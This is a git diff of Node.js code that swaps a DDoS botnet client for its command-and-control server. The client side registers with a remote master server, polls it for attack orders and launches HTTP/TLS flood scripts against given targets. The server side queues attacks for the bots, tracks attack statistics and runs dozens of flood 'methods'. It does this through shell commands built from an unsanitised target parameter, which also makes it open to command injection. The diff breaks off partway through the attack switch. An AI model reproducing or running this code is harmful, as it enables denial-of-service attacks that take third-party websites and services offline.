@@ -1,172 +1,143 @@
-const { exec, spawn } = require('child_process');
+const express = require('express');
+const { exec } = require('child_process');
+const axios = require('axios');
 const fs = require('fs');
-const path = require('path');
-const https = require('https');
-const http = require('http');
-const os = require('os');
 const crypto = require('crypto');
+const rateLimit = require('express-rate-limit');
+const path = require('path');
 
-// ========== CONFIGURATION ==========
-const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com'; // CHANGE THIS
-const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
-const MAX_REGISTRATION_ATTEMPTS = 5;
+const app = express();
+app.use(express.json());
 
-// ========== GENERATE UNIQUE BOT ID (NOT IP) ==========
-const generateBotId = () => {
-  const hostname = os.hostname();
-  const pid = process.pid;
-  const random = crypto.randomBytes(4).toString('hex');
-  return `${hostname}-${pid}-${random}`;
+const port = process.env.PORT || 5553;
+const AUTH_TOKEN = "ricardo";
+
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100
+});
+app.use('/api/', limiter);
+
+// Auth middleware
+const authenticate = (req, res, next) => {
+  const token = req.headers['authorization'] || req.query.token;
+  if (token !== AUTH_TOKEN) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  next();
 };
 
-const BOT_ID = generateBotId();
-const BOT_NAME = process.env.BOT_NAME || `${os.hostname()}-agent`;
+// Store connected bots
+let connectedBots = [];
+let pendingCommands = {};
+let stopCommands = new Set();
+let blockedBots = new Set();
+let attackHistory = [];
 
-// ========== GLOBAL VARIABLES ==========
-let registrationAttempts = 0;
-let activeProcesses = [];
-let isBlocked = false;
-let proxyList = [];
-let uaList = [];
-let currentProxyIndex = 0;
-let currentUaIndex = 0;
-let requestCount = 0;
-let totalRequests = 0;
-let currentAttack = null;
-let attackStartTime = null;
-
-// ========== COLORS ==========
-const colors = {
-  reset: '\x1b[0m',
-  red: '\x1b[31m',
-  green: '\x1b[32m',
-  yellow: '\x1b[33m',
-  blue: '\x1b[34m',
-  magenta: '\x1b[35m',
-  cyan: '\x1b[36m',
-  white: '\x1b[37m',
-  redBright: '\x1b[91m',
-  greenBright: '\x1b[92m',
-  yellowBright: '\x1b[93m',
-  blueBright: '\x1b[94m',
-  magentaBright: '\x1b[95m',
-  cyanBright: '\x1b[96m'
+// Stats
+let botStats = {
+  totalAttacks: 0,
+  activeAttacks: 0,
+  totalBots: 0,
+  requestsPerSecond: 0,
+  requestsPerMinute: 0,
+  totalRequests: 0,
+  attacksByMethod: {},
+  attacksByTarget: {},
+  botsByStatus: { online: 0, offline: 0, attacking: 0 },
+  averageResponseTime: 0,
+  peakRPS: 0,
+  peakRPM: 0,
+  lastMinuteRequests: [],
+  lastHourAttacks: []
 };
 
-function color(text, colorCode) {
-  return `${colorCode}${text}${colors.reset}`;
-}
+let requestTimestamps = [];
+let minuteRequestCount = 0;
+let currentMinute = new Date().getMinutes();
 
-// ========== AUTO INSTALL NPM PACKAGES ==========
-async function installNpmPackages() {
-  const requiredPackages = [
-    'express',
-    'axios',
-    'socks',
-    'random-useragent',
-    'cookie-parser',
-    'express-rate-limit',
-    'https-proxy-agent',
-    'socks-proxy-agent',
-    'set-cookie-parser',
-    'hpack',
-    'colors'
-  ];
+setInterval(() => {
+  const now = Date.now();
+  requestTimestamps = requestTimestamps.filter(ts => now - ts < 1000);
+  botStats.requestsPerSecond = requestTimestamps.length;
+  if (botStats.requestsPerSecond > botStats.peakRPS) botStats.peakRPS = botStats.requestsPerSecond;
+}, 1000);
 
-  console.log(color('\n🔍 Checking npm packages...', colors.cyan));
-  const missingPackages = [];
-  for (const pkg of requiredPackages) {
-    try {
-      require.resolve(pkg);
-      console.log(color(`   ✅ ${pkg} - installed`, colors.gray));
-    } catch (e) {
-      console.log(color(`   ⬇️  ${pkg} - missing`, colors.yellow));
-      missingPackages.push(pkg);
-    }
+setInterval(() => {
+  const minute = new Date().getMinutes();
+  if (minute !== currentMinute) {
+    botStats.requestsPerMinute = minuteRequestCount;
+    if (minuteRequestCount > botStats.peakRPM) botStats.peakRPM = minuteRequestCount;
+    botStats.lastMinuteRequests.push({ minute: new Date().toLocaleTimeString(), count: minuteRequestCount });
+    if (botStats.lastMinuteRequests.length > 60) botStats.lastMinuteRequests.shift();
+    minuteRequestCount = 0;
+    currentMinute = minute;
   }
+}, 1000);
 
-  if (missingPackages.length > 0) {
-    console.log(color(`\n📦 Installing: ${missingPackages.join(', ')}`, colors.cyan));
-    return new Promise((resolve, reject) => {
-      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
-        stdio: 'inherit',
-        shell: true
-      });
-      install.on('close', (code) => {
-        if (code === 0) {
-          console.log(color('\n✅ All packages installed!\n', colors.green));
-          resolve();
-        } else {
-          reject(new Error('Installation failed'));
-        }
-      });
-    });
-  }
-  return Promise.resolve();
-}
+app.use((req, res, next) => {
+  const start = Date.now();
+  requestTimestamps.push(start);
+  minuteRequestCount++;
+  botStats.totalRequests++;
+  res.on('finish', () => {
+    const duration = Date.now() - start;
+    botStats.averageResponseTime = botStats.averageResponseTime === 0 ? duration : (botStats.averageResponseTime * 0.9) + (duration * 0.1);
+  });
+  next();
+});
 
-// ========== CREATE PROXY.TXT IF MISSING ==========
-function createProxyFile() {
-  if (!fs.existsSync('proxy.txt')) {
-    const template = `# Proxy list - one per line
-# Format: ip:port
-# Example: 192.168.1.1:8080
-`;
-    fs.writeFileSync('proxy.txt', template);
-    console.log(color('📄 Created proxy.txt template', colors.green));
-  }
-}
-
-// ========== CREATE UA.TXT IF MISSING ==========
-function createUaFile() {
-  if (!fs.existsSync('ua.txt')) {
-    const userAgents = [
-      '# User Agents - one per line',
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    ];
-    fs.writeFileSync('ua.txt', userAgents.join('\n'));
-    console.log(color('📄 Created ua.txt template', colors.green));
-  }
-}
-
-// ========== CREATE METHODS DIRECTORY AND ALL SCRIPTS ==========
-function createMethodScripts() {
-  const methodsDir = path.join(__dirname, 'methods');
-  if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });
-
-  const writeScript = (filename, content) => {
-    const filePath = path.join(methodsDir, filename);
-    if (!fs.existsSync(filePath)) {
-      fs.writeFileSync(filePath, content);
-      console.log(color(`   ✅ Created ${filename}`, colors.green));
-    }
+// Bot timeout
+const BOT_TIMEOUT = 30000;
+setInterval(() => {
+  const now = Date.now();
+  connectedBots = connectedBots.filter(bot => now - bot.lastSeen <= BOT_TIMEOUT);
+  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
+  botStats.botsByStatus = {
+    online: online,
+    offline: connectedBots.length - online,
+    attacking: activeAttackCount()
   };
+  botStats.totalBots = connectedBots.length;
+}, 10000);
 
-  // Basic stub scripts (other methods)
-  const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
-  writeScript('high-dstat.js', stub('high-dstat'));
-  writeScript('w-flood1.js', stub('w-flood1'));
-  writeScript('vhold.js', stub('vhold'));
-  writeScript('nust.js', stub('nust'));
-  writeScript('BYPASS.js', stub('BYPASS'));
-  writeScript('cibi.js', stub('cibi'));
-  writeScript('REX-COSTUM.js', stub('REX-COSTUM'));
-  writeScript('h2-nust', stub('h2-nust'));
-  writeScript('http-panel.js', stub('http-panel'));
-  writeScript('uam.js', stub('uam'));
-  writeScript('wil.js', stub('wil'));
-  writeScript('cf-bypass.js', stub('cf-bypass'));
-  writeScript('modern-flood.js', stub('modern-flood'));
+function activeAttackCount() {
+  return connectedBots.filter(bot => pendingCommands[bot.id]).length;
+}
 
-  // R10 series stubs
-  const r10files = ['r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js', 'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'];
-  for (const f of r10files) writeScript(f, stub(f.replace('.js', '')));
+// Method files
+const methodFiles = {
+  'CF-BYPASS': 'methods/cf-bypass.js',
+  'MODERN-FLOOD': 'methods/modern-flood.js',
+  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
+  'RAW-HTTP': 'methods/h2-nust.js',
+  'RAW-GET': 'methods/raw-get.js',
+  'R9': 'methods/high-dstat.js',
+  'PRIV-TOR': 'methods/w-flood1.js',
+  'HOLD-PANEL': 'methods/http-panel.js',
+  'R1': 'methods/vhold.js',
+  'UAM': 'methods/uam.js',
+  'W.I.L': 'methods/wil.js',
+  'R10-TCP': 'methods/r10-tcp.js',
+  'R10-TLS': 'methods/r10-tls.js',
+  'R10-CONN': 'methods/r10-conn.js',
+  'R10-HEADER': 'methods/r10-header.js',
+  'R10-FRAG': 'methods/r10-frag.js',
+  'R10-PIPE': 'methods/r10-pipe.js',
+  'R10-COOKIE': 'methods/r10-cookie.js',
+  'R10-MIXED': 'methods/r10-mixed.js',
+  'R10-LOWCPU': 'methods/r10-lowcpu.js',
+  'RAPID10': 'methods/r10-rapid.js'
+};
 
-  // RAW-GET - NO PROXY VERSION (matches server)
-  const rawGetContent = `#!/usr/bin/env node
+// Ensure methods directory exists and create raw-get.js WITHOUT proxies
+function ensureMethodScripts() {
+  if (!fs.existsSync('./methods')) fs.mkdirSync('./methods');
+  
+  const rawGetPath = './methods/raw-get.js';
+  if (!fs.existsSync(rawGetPath)) {
+    const rawGetScript = `#!/usr/bin/env node
 
 // RAW-GET Flood - Pure GET requests, high RPS, minimal headers (NO PROXIES)
 
@@ -234,304 +205,283 @@ if (cluster.isMaster) {
     }, args.time * 1000);
 }
 `;
-  writeScript('raw-get.js', rawGetContent);
-
-  console.log(color('✅ All method scripts created!\n', colors.green));
-}
-
-// ========== REPORTING FUNCTION ==========
-async function sendReport(target, method, requestsMade, duration) {
-  try {
-    const axios = require('axios');
-    await axios.post(`${MASTER_SERVER}/api/report`, {
-      botId: BOT_ID,
-      target,
-      method,
-      requests: requestsMade,
-      duration
-    }, {
-      headers: { 'Content-Type': 'application/json' }
-    });
-    console.log(color(`📊 Report sent: ${requestsMade} requests to ${target}`, colors.cyan));
-  } catch (error) {
-    console.log(color(`⚠️ Report failed: ${error.message}`, colors.yellow));
+    fs.writeFileSync(rawGetPath, rawGetScript);
+    console.log('[SETUP] Created methods/raw-get.js (no proxy)');
   }
 }
 
-// ========== MAIN BOT ==========
-async function startBot() {
-  console.log(color('\n🤖 AUTO-REGISTER BOT CLIENT', colors.cyanBright));
-  console.log(color('='.repeat(50), colors.cyan));
-  console.log(color(`🆔 Bot ID: ${BOT_ID}`, colors.magentaBright));
-  console.log(color(`📛 Bot Name: ${BOT_NAME}`, colors.magentaBright));
-  console.log(color('='.repeat(50), colors.cyan));
+ensureMethodScripts();
 
-  createProxyFile();
-  createUaFile();
-  createMethodScripts();
-  await installNpmPackages();
-
-  const express = require('express');
-  const axios = require('axios');
-  const { SocksProxyAgent } = require('socks-proxy-agent');
-  const { HttpsProxyAgent } = require('https-proxy-agent');
-  const randomUseragent = require('random-useragent');
-  const cookieParser = require('cookie-parser');
-
-  const app = express();
-  app.use(express.json());
-  app.use(cookieParser());
-
-  // ========== PROXY & UA MANAGEMENT ==========
-  function loadProxies() {
-    try {
-      if (fs.existsSync('proxy.txt')) {
-        const data = fs.readFileSync('proxy.txt', 'utf8');
-        proxyList = data.split('\n')
-          .map(line => line.trim())
-          .filter(line => line && !line.startsWith('#') && line.includes(':'));
-        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
-      }
-    } catch (error) {
-      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
-    }
+// Validate other method files exist (warnings only)
+Object.entries(methodFiles).forEach(([method, file]) => {
+  if (!fs.existsSync(file)) {
+    console.warn(`[WARNING] Method file not found: ${file} for ${method}`);
   }
+});
 
-  function loadUserAgents() {
-    try {
-      if (fs.existsSync('ua.txt')) {
-        const data = fs.readFileSync('ua.txt', 'utf8');
-        uaList = data.split('\n')
-          .map(line => line.trim())
-          .filter(line => line && !line.startsWith('#'));
-        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
-      }
-    } catch (error) {
-      console.log(color('[UA] Error loading user agents: ' + error.message, colors.red));
-    }
+// ========== API ENDPOINTS (NO UI) ==========
+
+// Report endpoint
+app.post('/api/report', authenticate, (req, res) => {
+  const { botId, target, method, requests, duration } = req.body;
+  const bot = connectedBots.find(b => b.id === botId);
+  if (bot) {
+    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
+    bot.totalRequests = (bot.totalRequests || 0) + (requests || 0);
+    bot.lastReport = Date.now();
   }
+  botStats.totalRequests += requests || 0;
+  botStats.attacksByMethod[method] = (botStats.attacksByMethod[method] || 0) + 1;
+  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
+  console.log(`\n[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
+  res.json({ success: true });
+});
 
-  const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
-  const api = axios.create({ timeout: 10000, httpsAgent, headers: { 'Content-Type': 'application/json' } });
+// Stats API
+app.get('/api/stats', authenticate, (req, res) => {
+  const now = Date.now();
+  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
+  botStats.botsByStatus = { online, offline: connectedBots.length - online, attacking: activeAttackCount() };
+  botStats.totalBots = connectedBots.length;
+  res.json(botStats);
+});
 
-  // ========== AUTO REGISTER ==========
-  async function autoRegister() {
-    if (isBlocked) {
-      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
-      process.exit(0);
-    }
-    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
-      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
-      setTimeout(() => { registrationAttempts = 0; autoRegister(); }, 60000);
-      return;
-    }
-    try {
-      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
-      const payload = { id: BOT_ID, name: BOT_NAME };
-      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));
-      const response = await api.post(`${MASTER_SERVER}/register`, payload);
-      if (response.data.approved) {
-        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
-        setInterval(() => checkForCommands(), 3000);
-        setInterval(() => sendHeartbeat(), 30000);
-        return;
-      }
-    } catch (error) {
-      console.log(color(`❌ Registration failed:`, colors.red));
-      if (error.response && error.response.status === 403) {
-        console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
-        isBlocked = true;
-        process.exit(0);
-      }
-      registrationAttempts++;
-      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
-      setTimeout(() => autoRegister(), 5000);
-    }
+// Bot registration (using ID)
+app.post('/register', (req, res) => {
+  let { id, name, url } = req.body;
+  if (!id) {
+    if (url) id = url;
+    else return res.status(400).json({ error: 'Bot unique id required' });
   }
-
-  async function sendHeartbeat() {
-    try {
-      await api.get(`${MASTER_SERVER}/ping`);
-      console.log(color(`💓 Heartbeat | ID: ${BOT_ID} | Total Reqs: ${totalRequests}`, colors.green));
-    } catch (error) {
-      console.log(color(`💔 Heartbeat failed`, colors.red));
-      registrationAttempts = 0;
-      autoRegister();
-    }
+  if (blockedBots.has(id)) {
+    console.log(`[BLOCKED] Bot tried to register: ${id}`);
+    return res.status(403).json({ error: 'Bot is blocked', approved: false });
   }
+  const existing = connectedBots.find(b => b.id === id);
+  if (existing) {
+    existing.lastSeen = Date.now();
+    return res.json({ message: 'Bot already registered', approved: true, bot: existing });
+  }
+  const botName = name || `agent-${id.slice(-6)}`;
+  const newBot = { 
+    id, 
+    name: botName, 
+    lastSeen: Date.now(), 
+    registeredAt: new Date().toLocaleString(), 
+    attacksPerformed: 0, 
+    totalRequests: 0 
+  };
+  connectedBots.push(newBot);
+  botStats.totalBots = connectedBots.length;
+  console.log(`[AUTO-APPROVED] New bot registered: ${botName} (${id})`);
+  res.json({ message: 'Bot auto-approved', approved: true, bot: newBot });
+});
 
-  async function checkForCommands() {
-    try {
-      const response = await api.get(`${MASTER_SERVER}/get-command`, {
-        params: { botId: BOT_ID }
-      });
-      if (response.data.hasCommand) {
-        const command = response.data.command;
-        if (command.action === 'stop') {
-          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
-          stopAllAttacks();
-        } else if (command.action === 'attack') {
-          const { target, time, methods } = command;
-          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
-          executeAttack(target, time, methods);
-        }
+// Command polling
+app.get('/get-command', (req, res) => {
+  const { botId } = req.query;
+  if (!botId) return res.status(400).json({ error: 'Bot ID required' });
+  const bot = connectedBots.find(b => b.id === botId);
+  if (bot) bot.lastSeen = Date.now();
+  if (stopCommands.has(botId)) {
+    stopCommands.delete(botId);
+    return res.json({ hasCommand: true, command: { action: 'stop' } });
+  }
+  if (pendingCommands[botId]) {
+    const command = pendingCommands[botId];
+    delete pendingCommands[botId];
+    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
+  }
+  res.json({ hasCommand: false });
+});
+
+// Admin endpoints (authenticated)
+app.get('/bots', authenticate, (req, res) => {
+  const botsForUI = connectedBots.map(b => ({
+    id: b.id, name: b.name, lastSeen: b.lastSeen, registeredAt: b.registeredAt,
+    attacksPerformed: b.attacksPerformed || 0, totalRequests: b.totalRequests || 0
+  }));
+  res.json({ bots: botsForUI });
+});
+
+app.get('/attack-bot', authenticate, async (req, res) => {
+  const { botId, target, time, methods } = req.query;
+  if (!botId || !target || !time || !methods) return res.json({ success: false, error: 'Missing parameters' });
+  const timeNum = parseInt(time);
+  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) return res.json({ success: false, error: 'Invalid time' });
+  const bot = connectedBots.find(b => b.id === botId);
+  if (!bot) return res.json({ success: false, error: 'Bot not found' });
+  pendingCommands[botId] = { target, time: timeNum, methods, timestamp: Date.now() };
+  botStats.totalAttacks++;
+  botStats.activeAttacks++;
+  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
+  console.log(`[CMD] Attack queued for bot ${bot.name} (${botId}): ${methods} → ${target} for ${timeNum}s`);
+  res.json({ success: true, message: `Command sent to ${bot.name}` });
+});
+
+app.get('/stop-bot', authenticate, async (req, res) => {
+  const { botId } = req.query;
+  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
+  delete pendingCommands[botId];
+  stopCommands.add(botId);
+  res.json({ success: true, message: 'Stop command sent' });
+});
+
+app.get('/stop-all', authenticate, async (req, res) => {
+  pendingCommands = {};
+  connectedBots.forEach(bot => stopCommands.add(bot.id));
+  botStats.activeAttacks = 0;
+  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
+});
+
+app.get('/block-bot', authenticate, (req, res) => {
+  const { botId } = req.query;
+  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
+  blockedBots.add(botId);
+  connectedBots = connectedBots.filter(b => b.id !== botId);
+  delete pendingCommands[botId];
+  stopCommands.delete(botId);
+  botStats.totalBots = connectedBots.length;
+  res.json({ success: true, message: 'Bot blocked', botId });
+});
+
+app.get('/unblock-bot', authenticate, (req, res) => {
+  const { botId } = req.query;
+  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
+  blockedBots.delete(botId);
+  res.json({ success: true, message: 'Bot unblocked', botId });
+});
+
+app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(blockedBots) }));
+
+app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));
+
+// Server-side attack endpoint (RAW-GET now without proxy)
+app.get('/attack', authenticate, (req, res) => {
+  const { target, time, methods } = req.query;
+  if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });
+  const timeNum = parseInt(time);
+  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) return res.status(400).json({ error: 'Invalid time' });
+  const methodFile = methodFiles[methods];
+  if (!methodFile || !fs.existsSync(methodFile)) {
+    return res.status(400).json({ error: `Method file not found for ${methods}` });
+  }
+  console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${timeNum}s`);
+  attackHistory.push({ target, time: timeNum, method: methods, timestamp: Date.now() });
+  botStats.totalAttacks++;
+  botStats.activeAttacks++;
+  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
+  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
+  res.status(200).json({ message: 'Server attack launched', target, time: timeNum, methods });
+
+  const execWithLog = (cmd) => {
+    exec(cmd, (error, stdout, stderr) => {
+      if (error) { console.error(`[ERROR] ${error.message}`); botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1); return; }
+      if (stdout) {
+        const lines = stdout.split('\n');
+        const requestLines = lines.filter(l => l.includes('Request') || l.includes('GET') || l.includes('POST')).length;
+        if (requestLines > 0) botStats.totalRequests += requestLines;
+        console.log(`[OUTPUT] ${stdout}`);
       }
-    } catch (error) {}
-  }
-
-  function stopAllAttacks() {
-    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
-    activeProcesses.forEach(proc => {
-      try { process.kill(-proc.pid); } catch (error) {}
+      if (stderr) console.error(`[STDERR] ${stderr}`);
     });
-    activeProcesses = [];
-    currentAttack = null;
-    requestCount = 0;
-    console.log(color(`✅ All attacks stopped`, colors.green));
+  };
+
+  switch(methods) {
+    case 'CF-BYPASS':
+      execWithLog(`node methods/cf-bypass.js ${target} ${timeNum} 4 32 proxy.txt`);
+      break;
+    case 'MODERN-FLOOD':
+      execWithLog(`node methods/modern-flood.js ${target} ${timeNum} 4 64 proxy.txt`);
+      break;
+    case 'HTTP-SICARIO':
+      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
+      execWithLog(`node methods/cibi.js ${target} ${timeNum} 16 3 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 32 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${timeNum} 12 4 proxy.txt`);
+      break;
+    case 'RAW-HTTP':
+      execWithLog(`node methods/h2-nust ${target} ${timeNum} 15 2 proxy.txt`);
+      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
+      break;
+    case 'RAW-GET':
+      // No proxy argument – script ignores proxy.txt
+      execWithLog(`node methods/raw-get.js ${target} ${timeNum} 20 800`);
+      break;
+    case 'R9':
+      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt`);
+      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
+      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${timeNum} 16 2 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 8 1 proxy.txt`);
+      break;
+    case 'PRIV-TOR':
+      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 64 6 proxy.txt`);
+      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 16 2 proxy.txt`);
+      execWithLog(`node methods/cibi.js ${target} ${timeNum} 12 4 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 10 4 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${timeNum} 10 1 proxy.txt`);
+      break;
+    case 'HOLD-PANEL':
+      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
+      break;
+    case 'R1':
+      execWithLog(`node methods/vhold.js ${target} ${timeNum} 15 2 proxy.txt`);
+      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 64 2 proxy.txt`);
+      execWithLog(`node methods/cibi.js ${target} ${timeNum} 4 2 proxy.txt`);
+      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 16 2 proxy.txt`);
+      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
+      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
+      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
+      execWithLog(`node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`);
+      break;
+    case 'RAPID10':
+      execWithLog(`node methods/r10-rapid.js ${target} ${timeNum} 10000`);
+      execWithLog(`node methods/r10-tcp.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-tls.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-conn.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-header.js ${target} ${timeNum} 5000`);
+      execWithLog(`node methods/r10-frag.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-pipe.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-cookie.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-mixed.js ${target} ${timeNum}`);
+      execWithLog(`node methods/r10-lowcpu.js ${target} ${timeNum} 1000`);
+      break;
+    case 'UAM':
+      execWithLog(`node methods/uam.js ${target} ${timeNum} 5 4 6`);
+      break;
+    case 'W.I.L':
+      execWithLog(`node methods/wil.js ${target} ${timeNum} 10 8 4`);
+      break;
+    default:
+      console.error(`[ERROR] Unknown method: ${methods}`);
+      botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
   }
 
-  function executeAttack(target, time, methods) {
-    currentAttack = { id: Date.now(), target, methods, startTime: Date.now() };
-    requestCount = 0;
-    attackStartTime = Date.now();
+  setTimeout(() => {
+    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
+  }, timeNum * 1000);
+});
 
-    const execWithLog = (cmd) => {
-      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
-      const proc = exec(cmd, { detached: true, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
-        if (error) { console.error(color(`❌ Error: ${error.message}`, colors.red)); return; }
-        if (stdout) {
-          const lines = stdout.split('\n');
-          lines.forEach(line => {
-            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
-                line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
-              requestCount++;
-              totalRequests++;
-            }
-          });
-        }
-        if (stderr) console.error(color(`⚠️ ${stderr}`, colors.yellow));
-      });
-      activeProcesses.push(proc);
-      setTimeout(() => {
-        const index = activeProcesses.indexOf(proc);
-        if (index > -1) {
-          try { process.kill(-proc.pid); } catch (e) {}
-          activeProcesses.splice(index, 1);
-        }
-      }, parseInt(time) * 1000 + 5000);
-    };
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('[SERVER ERROR]', err.stack);
+  res.status(500).json({ error: 'Internal server error' });
+});
 
-    // Attack methods including RAW-GET (no proxy)
-    switch(methods) {
-      case 'RAPID10':
-        execWithLog(`node methods/r10-rapid.js ${target} ${time} 30 proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-tcp.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-tls.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-conn.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-header.js ${target} ${time} 30 proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-frag.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-pipe.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-cookie.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-mixed.js ${target} ${time} proxy.txt ua.txt`);
-        execWithLog(`node methods/r10-lowcpu.js ${target} ${time} 40 proxy.txt ua.txt`);
-        break;
-      case 'CF-BYPASS':
-        execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
-        break;
-      case 'MODERN-FLOOD':
-        execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
-        break;
-      case 'HTTP-SICARIO':
-        execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
-        execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
-        execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
-        execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
-        break;
-      case 'RAW-HTTP':
-        execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
-        execWithLog(`node methods/http-panel.js ${target} ${time}`);
-        break;
-      case 'RAW-GET':
-        // NO PROXY argument - matches server
-        execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
-        break;
-      case 'R9':
-        execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
-        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
-        execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
-        execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
-        execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
-        break;
-      case 'PRIV-TOR':
